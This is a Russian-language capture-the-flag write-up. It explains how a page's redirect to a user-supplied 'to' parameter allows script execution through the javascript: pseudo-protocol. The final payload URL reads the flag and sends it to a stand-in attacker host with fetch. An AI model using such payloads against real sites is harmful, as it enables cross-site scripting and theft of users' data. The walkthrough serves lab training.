# SC task writeup

Решающий после ознакомления с исходными кодами задачи должен прийти к выводу, что это таск нацеленный на эксплуатацию client-side уязвимостей.

Исходя из этого рассмотрим исходный код клиента:
```js
const reportInp = document.querySelector(".report--input")
const reportSubmit = document.querySelector(".report--submit")

const submitForm = () => {
  window.location = `/report?url=${encodeURIComponent(reportInp.value)}`
}

const main = async () => {
  const searchParams = new URL(window.location).searchParams
  const q = searchParams.get("q")
  const to = searchParams.get("to")
  if (!q) return

  const regex = new RegExp(q)
  const flag = await fetch("/flag").then(res => res.text())
  
  const match = regex.test(flag)
  if (match && to) window.location = to
}
main()
```

Данный код и пытается проверить наличие вхождений по регулярному выражению указанном в GET параметре q. Если вхождения найдены, код перенапрявляет на страницу указанную в GET параметре to.

Этим можно воспользоваться и получить произвольное исполнение javascript кода в рамках origin атакуемого хоста.
Для этого нужно заставить бота пройти по следущей ссылке:
```
http://localhost:5000/?q=.*&to=javascript:alert(window.origin)
```

В гет параметре to мы указали ссылку с псевдопротоколом javascript, который и позволяет нам исполнять произвольный js код.

Финальная нагрузка выглядет следующим образом:
```
http://localhost:5000/?q=.*&to=javascript:fetch("/flag").then(res => res.text()).then(res => fetch("http://ATTACKER_DOMAIN/" + res))
```


